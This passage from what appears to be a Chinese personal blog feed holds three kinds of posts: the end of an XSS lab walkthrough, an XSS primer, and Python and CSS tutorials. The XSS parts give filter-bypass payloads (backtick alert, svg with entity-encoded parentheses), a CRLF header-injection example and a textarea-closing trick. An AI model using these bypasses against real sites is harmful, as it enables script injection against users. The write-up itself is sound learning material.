src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669077403237.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第十一关至第十三关"><a href="#第十一关至第十三关" class="headerlink" title="第十一关至第十三关"></a>第十一关至第十三关</h3><p>这几关都是http头注入需要抓包来完成，基本大差不差的。<br>第十一关 Referer<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669099835862.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669091402139.jpg?raw=true" srcset="/img/loading.gif" alt><br>第十二关 ua<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669102310614.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101896563.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101286592.jpg?raw=true" srcset="/img/loading.gif" alt><br>第十三关 cookie<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103883723.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103999546.jpg?raw=true" srcset="/img/loading.gif" alt><br>明显是cookie注入了<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669104596197.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第十四至最后"><a href="#第十四至最后" class="headerlink" title="第十四至最后"></a>第十四至最后</h3><p>这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。</p><h2 id="绕过姿势小补充"><a href="#绕过姿势小补充" class="headerlink" title="绕过姿势小补充"></a>绕过姿势小补充</h2><h3 id="“-”被过滤"><a href="#“-”被过滤" class="headerlink" title="“()”被过滤"></a>“()”被过滤</h3><p>用” ` “ 字符了来代替括号。</p><p>payload: alert`1`</p><h4 id="小进阶-“-“-“-”同时被过滤"><a href="#小进阶-“-“-“-”同时被过滤" class="headerlink" title="小进阶 “ ` “ “()”同时被过滤"></a>小进阶 “ ` “ “()”同时被过滤</h4><p>可以使用 <code>&lt;svg&gt;</code> 标签，其有一个特性就是可以执行HTML实体代码。用法是<code>&lt;svg&gt;&amp;#数字;</code><br>所以构造payload:<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS知识简单学习</title>
    <link href="/2019/08/16/xss%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/08/16/xss%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS知识简单学习"><a href="#XSS知识简单学习" class="headerlink" title="XSS知识简单学习"></a>XSS知识简单学习</h1><h2 id="一-Xss简介"><a href="#一-Xss简介" class="headerlink" title="一:Xss简介"></a>一:Xss简介</h2><p>XSS攻击全称<strong>跨站脚本攻击</strong>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p><h2 id="二：ajax简介"><a href="#二：ajax简介" class="headerlink" title="二：ajax简介"></a>二：ajax简介</h2><p>ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。<br>为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。</p><h2 id="三：xss漏洞分类"><a href="#三：xss漏洞分类" class="headerlink" title="三：xss漏洞分类"></a>三：xss漏洞分类</h2><h3 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h3><p>存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。</p><p>用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 </p><h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。</p><p>其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。</p><h3 id="Dom-xss"><a href="#Dom-xss" class="headerlink" title="Dom-xss"></a>Dom-xss</h3><p>通过URL传入参数所触发，<strong>其不与服务器进行通信</strong>，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。</p><h2 id="四：X-XSS-Protection"><a href="#四：X-XSS-Protection" class="headerlink" title="四：X-XSS-Protection"></a>四：X-XSS-Protection</h2><p>是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。<br>筒単一句活:<br>`header(“X-XSS-Protection: 0”);告泝浏览器禁用XSS保枦<br>header(“X-XSS-Protection: 1”);告泝浏览器幵宕XSS保枦`</p><h2 id="五：CRLF响应头注入"><a href="#五：CRLF响应头注入" class="headerlink" title="五：CRLF响应头注入"></a>五：CRLF响应头注入</h2><p><code>Location: http://****%0d%0aX-XSS-Protection: 0</code><br>就是相当于<br>`Location: http://****<br>XSS-Protection: 0`<br>这就是一个注入，又添加了一个响应头。<br>但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。<br>应用场景：</p><ul><li>php&lt;5.1</li><li>碰到了服务器开启xss拦截</li></ul><h2 id="六：修补xss漏洞（简单）"><a href="#六：修补xss漏洞（简单）" class="headerlink" title="六：修补xss漏洞（简单）"></a>六：修补xss漏洞（简单）</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>例如 &gt; &lt; Script等等字眼</p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>利用php函数 htmlentities()把字符转换为HTML实体</p><h2 id="七：闭合xss"><a href="#七：闭合xss" class="headerlink" title="七：闭合xss"></a>七：闭合xss</h2><p>当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是<code>&#39;&quot;&gt;&lt;/textarea&gt;</code>+js代码 即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简易解决python2.X与python3.x共存问题</title>
    <link href="/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/"/>
    <url>/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="简易解决python2-X与python3-x共存问题"><a href="#简易解决python2-X与python3-x共存问题" class="headerlink" title="简易解决python2.X与python3.x共存问题"></a>简易解决python2.X与python3.x共存问题</h1><p>python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。</p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>Python目前还是需要分开安装</p><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">-2</span> -m pip install xxxx</code></pre></div><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">-3</span> -m pip install xxxx</code></pre></div><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>分别用py2.x py3.x运行一个1.py的脚本：</p><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">-2</span> <span class="hljs-number">1.</span>py</code></pre></div><div class="hljs"><pre><code class="hljs html">py -3 1.py</code></pre></div><p>或者在1.py的文件代码头加上<code>#! python3</code>  <code>#! python2</code>看个人的情况。</p><p>这样就直接输入：</p><div class="hljs"><pre><code class="hljs python">py <span class="hljs-number">1.</span>py</code></pre></div><p>这只是解决了简单的<strong><u>安装模块和运行脚本</u></strong>的问题。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>css学习</title>
    <link href="/2019/03/30/css%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/03/30/css%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="如何使用CSS"><a href="#如何使用CSS" class="headerlink" title="如何使用CSS"></a>如何使用CSS</h2><p>CSS<br>可以通过以下方式添加到HTML中:</p><ol><li>内联样式- 在HTML元素中使用”style” <strong>属性 (不推荐使用)；</strong></li><li>内部样式表 -在HTML文档头部 <code>&lt;head&gt;</code> 区域使用<code>&lt;style&gt;</code><strong>元素</strong> 来包含CSS。</li><li>外部引用 - 使用外部 CSS <strong>文件</strong>(==推荐使用)==</li></ol><h4 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h4><p>应用到个别元素时，就可以使用内联样式。</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: red;width: 100px; height: 100px; background: yellow"</span>&gt;</span>苹果<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><h4 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h4><p>当单个文件需要特别样式时，就可以使用<strong>内部样式表</strong>。你可以在<code>&lt;head&gt;</code> 部分通过 <code>&lt;style&gt;</code>标签定义内部样式表:。也推荐这样使用便于更改全局。</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">div</span>&#123;<span class="hljs-attribute">color</span>: red;<span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;            <span class="hljs-attribute">background</span>: yellow&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre></div><p><strong>注：在头文件写的时候 style还是个开闭标签。</strong></p><h4 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h4><p>用<code>&lt;link&gt;</code>当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"mystyle.css"</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre></div><p><strong>其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址；</strong></p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a><strong>练习：</strong></h4><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>css三种引入方式<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;style&gt;div&#123;color: red;width: 100px; height: 100px;            background: yellow&#125;&lt;/style&gt; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1.css"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>      <span class="hljs-comment">&lt;!-- &lt;div style="color: red;width: 100px; height: 100px; background: yellow"&gt;苹果&lt;/div&gt; --&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> 苹果1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><div class="hljs"><pre><code class="hljs html">div&#123;color: red;width: 100px; height: 100px;    background: yellow&#125;   <span class="hljs-comment">&lt;!-- 1.css --&gt;</span></code></pre></div><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css1.jpg?raw=true" srcset="/img/loading.gif" alt="CSS 语法"></p><h2 id="CSS-语法"><a href="#CSS-语法" class="headerlink" title="CSS 语法"></a>CSS 语法</h2><h4 id="CSS-语法规则"><a href="#CSS-语法规则" class="headerlink" title="CSS 语法规则"></a>CSS 语法规则</h4><p>由两个主要的部分构成：选择器，以及一条或多条声明:</p><ul><li>选择器通常是您需要改变样式的 HTML 元素。</li><li>每条声明由一个属性和一个值组成。</li><li>属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。</li><li>CSS声明总是以分号(;)结束，声明组以大括号({})括起来</li></ul><p>例：<code>h1{ color:blue; font-size :12px;}</code></p><p>其中h1 为选择器 color 是属性 blue是值。</p><h4 id="CSS-注释："><a href="#CSS-注释：" class="headerlink" title="CSS 注释："></a><strong>CSS 注释</strong>：</h4><p>CSS注释以 “<strong>/*</strong>“ 开始, 以 “<strong>*/</strong>“ 结束。</p><h4 id="颜色："><a href="#颜色：" class="headerlink" title="颜色："></a>颜色：</h4><p>颜色属性被用来设置文字的颜色。</p><p>颜色是通过CSS最经常的指定：</p><ul><li>十六进制值 - 如: <strong>＃FF0000</strong></li><li>一个RGB值 - 如: <strong>RGB(255,0,0)</strong></li><li>颜色的名称 - 如: <strong>red</strong></li></ul><p><strong>常用的</strong>：<strong>rgb：</strong>：r是红色，g是绿色，b是蓝色。</p><div class="hljs"><pre><code class="hljs html">body &#123;color:red;&#125;  h1 &#123;color:#00ff00;&#125;   /* 可以写成 #0f0 */h2 &#123;color:rgb(255,0,0);&#125;   /* 0-255 */ 是其颜色深浅</code></pre></div><p>==<strong>注</strong> - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。==</p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p><strong>基本选择器</strong>：</p><ul><li><strong>id 选择器</strong>：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以<strong>id属性</strong>来设置id选择器,CSS 中 id 选择器以 <strong>“#”</strong> 来定义。（==ID属性不要以数字开头==）</li><li><strong>class 选择器</strong>：class 选择器用于描述<strong>一组元素的样式</strong>，class 选择器有别于id选择器，class可以在多个元素中使用。 例：<code>&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt;</code>  。class 选择器在HTML中以<strong>class属性</strong>表示, 在 CSS 中，类选择器以一个点<strong>“.”</strong>号显示</li><li><code>*</code>通配符：全部标签属性的都会有效果。</li><li><strong>标签 div</strong>：div标签 的会有效果。</li></ul><p><strong>练习</strong>：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>css选择器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1.css"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div111<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div222<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"txt"</span>&gt;</span>the way i am<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"txt1 txt2"</span>&gt;</span>song<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>css：</p><div class="hljs"><pre><code class="hljs html">div&#123;color: red;width: 100px; height: 100px;    background: yellow&#125;#txt&#123;color: #1f1;&#125;.txt1 &#123;font-size: 10px;&#125;.txt2 &#123;color: #ff2;&#125;</code></pre></div><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css2.png?raw=true" srcset="/img/loading.gif" alt></p><h2 id="CSS原理"><a href="#CSS原理" class="headerlink" title="CSS原理"></a>CSS原理</h2><h4 id="优先原则"><a href="#优先原则" class="headerlink" title="优先原则"></a>优先原则</h4><p><strong>优先原则</strong>：后解析的内容，会覆盖掉原来解析的内容。</p><p><strong>1:同一个选择器</strong>:从上往下执行。</p><p>例：</p><div class="hljs"><pre><code class="hljs html">div&#123;     color: red;color: green;  &#125;/*最终是为绿色*/</code></pre></div><p><strong>2:同一类型的选择器</strong>：从上往下执行</p><p>例：</p><div class="hljs"><pre><code class="hljs html">div&#123;background: yellow;&#125;div&#123;background: red;&#125;/*最终是为红色*/</code></pre></div><div class="hljs"><pre><code class="hljs html">.bg1&#123;background: yellow;&#125;.bg2&#123;background: blue;&#125;/*最终是为蓝色*/</code></pre></div><p><code>&lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt;</code>  <strong>在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue</strong>。</p><p><strong>3：不同类型的选择器：</strong>看优先级</p><p>先解析低级的在解析高级的：<strong>* &lt; div &lt; class &lt; id</strong></p><div class="hljs"><pre><code class="hljs html">div&#123;color: red；&#125;.bg1&#123;color: yellow;&#125;   /*最终是为黄色*/</code></pre></div><p><strong>4：多重样式优先级</strong></p><p>样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。</p><p>一般情况下，优先级如下：</p><p><strong>内联样式 &gt; 内部样式 &gt;外部样式</strong>      ==（谁优先级越高越最后解析）==</p><p>对于全部都是 当加上<code>!important</code>  这个选择器的内容就会最后进行。 </p><h4 id="继承原则"><a href="#继承原则" class="headerlink" title="继承原则"></a>继承原则</h4><p>==<strong>对于嵌套标签，子级继承父级。</strong>==</p><ol><li>文字 文本 样式可以继承，其他的不能。 </li><li>块级元素 没有设置的时候，会继承父级的<strong>宽</strong>，而高度则是看其内容长短。</li></ol><h2 id="CSS组成选择器"><a href="#CSS组成选择器" class="headerlink" title="CSS组成选择器"></a>CSS组成选择器</h2><h4 id="分组选择器"><a href="#分组选择器" class="headerlink" title="分组选择器"></a>分组选择器</h4><p>直接上代码了：</p><div class="hljs"><pre><code class="hljs html">div&#123;background: green;color: red;&#125;p&#123;   background: green;color: red;   font-size: 50px;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html">div,p&#123;background: green;color: red;&#125;p&#123;   font-size: 50px;&#125;</code></pre></div><p><strong>把div 与 p 里面相同的部分放到一个里面就行了。</strong></p><h4 id="嵌套选择器"><a href="#嵌套选择器" class="headerlink" title="嵌套选择器"></a>嵌套选择器</h4><div class="hljs"><pre><code class="hljs html">div p&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> div1<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div2<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><p><strong>只要在其父或父的以上级有div，那这个p里的东西就能生效</strong>。</p><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css3.jpg?raw=true" srcset="/img/loading.gif" alt></p><h4 id="子选择器"><a href="#子选择器" class="headerlink" title="子选择器"></a>子选择器</h4><p><strong>这个和以上很类似，区别在只在其父为div时，才能生效。</strong></p><div class="hljs"><pre><code class="hljs html">div&gt;p&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><p><strong>类比以上就是只有p2有css效果</strong></p><h4 id="同级选择器"><a href="#同级选择器" class="headerlink" title="同级选择器"></a>同级选择器</h4><div class="hljs"><pre><code class="hljs html">div+p&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><p>在平级的p才可以生效，对比以上，也就是p1是有css效果。</p><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><div class="hljs"><pre><code class="hljs html">p[title=cc]&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> div1<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div2<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc"</span>&gt;</span>p3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc 1"</span>&gt;</span>p1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><p>基本标签==+==</p><ul><li><p>[属性=值]：p3出现css效果。</p></li><li><p>[属性~=值]：p1 p3出现css效果。  注意：代码中<code>cc 1</code>需要空格隔开，不隔没有效果。</p></li><li><p>[属性^=值]：开头有cc的字符就行<code>cc1</code>. p1 p3 出现cc效果。</p></li><li><p>[属性$=值]：类比<code>^=</code>  是结束。</p></li></ul><h2 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h2><p>每个我自己写出来的元素都会有伪元素。、</p><p>例：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc"</span>&gt;</span> <span class="hljs-comment">&lt;!--&lt;before&gt; --&gt;</span>  ppp  <span class="hljs-comment">&lt;!--&lt;after&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre></div><p>直接上代码：</p><div class="hljs"><pre><code class="hljs html">p::before&#123;content: "before"    &#125;p::after&#123;content: "after"&#125;</code></pre></div><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css4.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><strong>块元素：</strong></p><p>第一个字母：<code>first-letter</code></p><p>第一行：<code>first-line</code></p><div class="hljs"><pre><code class="hljs html">p::first-letter&#123;color: red;font-size: 100px;&#125;</code></pre></div><p>这些写就是会是p内内容第一个<strong>字符</strong>大写。</p><p>也可以为</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">first-letter</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">first-letter</span>&gt;</span>he way i am ;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre></div><h2 id="CSS-背景"><a href="#CSS-背景" class="headerlink" title="CSS 背景"></a>CSS 背景</h2><p>CSS 背景属性用于定义HTML元素的背景。</p><h4 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h4><p><code>background-color</code> 属性定义了元素的背景颜色.</p><p>页面的背景颜色使用在body的选择器中:</p><p><code>body {background-color:red;}</code></p><h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p><code>background-image</code>属性描述了元素的背景图像.</p><p>默认情况下，背景图像进行<strong>平铺重复</strong>显示.</p><p><code>body {background-image:url(&#39;1.png&#39;);}</code></p><h4 id="背景图像-相关设置"><a href="#背景图像-相关设置" class="headerlink" title="背景图像 - 相关设置"></a>背景图像 - 相关设置</h4><ul><li><strong>水平或垂直平铺</strong>：</li></ul><div class="hljs"><pre><code class="hljs html">body&#123;background-image:url('gradient2.png');background-repeat:repeat-x;&#125;</code></pre></div><p>  里面repeat-x是x轴，repeat-y是y轴。</p><ul><li><strong>不平铺：</strong><code>background-repeat:no-repeat</code></li><li><strong>定位：</strong></li></ul><p>​      <code>background-position:50% 0%</code> 这使其在x轴的中心，</p><p>​        x： left center right；</p><p>​        y:  top center bottom；</p><h2 id="css字体"><a href="#css字体" class="headerlink" title="css字体"></a>css字体</h2><h4 id="css字体-1"><a href="#css字体-1" class="headerlink" title="css字体"></a>css字体</h4><ul><li><p><strong>字体系列</strong>：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。</p><p>例：<code>font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;;</code></p></li><li><p><strong>字体样式</strong>:<code>font-style:italic;</code>斜体</p></li><li><p><strong>字体大小</strong>：font-size 属性设置文本的大小。<code>font-size:40px;</code> font-weight: 设置其粗细。font-weight:</p><p>normal lighter blod;</p></li></ul><p>练习：</p><div class="hljs"><pre><code class="hljs html">body &#123;font-family: "黑体","宋体";font-style:italic;font-size:80px;font-weight: bold;&#125;  /*5.css */</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span 